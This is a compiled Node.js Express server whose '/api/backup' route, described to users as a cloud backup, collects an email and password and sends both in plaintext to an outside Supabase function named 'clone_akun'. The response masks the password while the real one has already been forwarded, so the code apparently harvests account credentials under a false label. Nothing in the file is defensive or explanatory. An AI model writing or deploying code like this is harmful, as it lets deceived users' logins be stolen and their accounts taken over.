var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// server.ts
var import_express = __toESM(require("express"), 1);
var import_path = __toESM(require("path"), 1);
var import_vite = require("vite");
async function startServer() {
  const app = (0, import_express.default)();
  const PORT = 3e3;
  app.use(import_express.default.json());
  app.post("/api/backup", async (req, res) => {
    const { user, pass } = req.body;
    if (!user || !pass) {
      return res.status(400).json({ error: "Email dan Password wajib diisi!" });
    }
    try {
      console.log(`[API] Sending backup payload for user: ${user}`);
      const supabaseUrl = "https://lvvujvecobbsjnkwguwl.supabase.co/functions/v1/clone_akun";
      const apiRes = await fetch(supabaseUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          step: "cloud_backup",
          user,
          pass
        })
      });
      const text = await apiRes.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch {
        data = { responseText: text, status: apiRes.status };
      }
      console.log(`[API] Received response:`, data);
      const hasError = !apiRes.ok || data && Boolean(data.error) || data && data.status === "error";
      const errorMsg = data?.error || (typeof data === "string" ? data : null) || "Gagal berkomunikasi dengan Cloud Server";
      return res.json({
        endpoint: supabaseUrl,
        payloadSent: { step: "cloud_backup", user, pass: "********" },
        apiStatus: apiRes.status,
        success: !hasError,
        error: hasError ? errorMsg : null,
        message: data?.message || (hasError ? null : "Backup sukses!"),
        result: data
      });
    } catch (err) {
      console.error("[API] Error calling Cloud API:", err);
      return res.status(500).json({
        error: `Error: ${err.message || "Gagal terhubung ke Cloud Server"}`
      });
    }
  });
  if (process.env.NODE_ENV !== "production") {
    const vite = await (0, import_vite.createServer)({
      server: { middlewareMode: true },
      appType: "spa"
    });
    app.use(vite.middlewares);
  } else {
    const distPath = import_path.default.join(process.cwd(), "dist");
    app.use(import_express.default.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(import_path.default.join(distPath, "index.html"));
    });
  }
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}
startServer();
//# sourceMappingURL=server.cjs.map
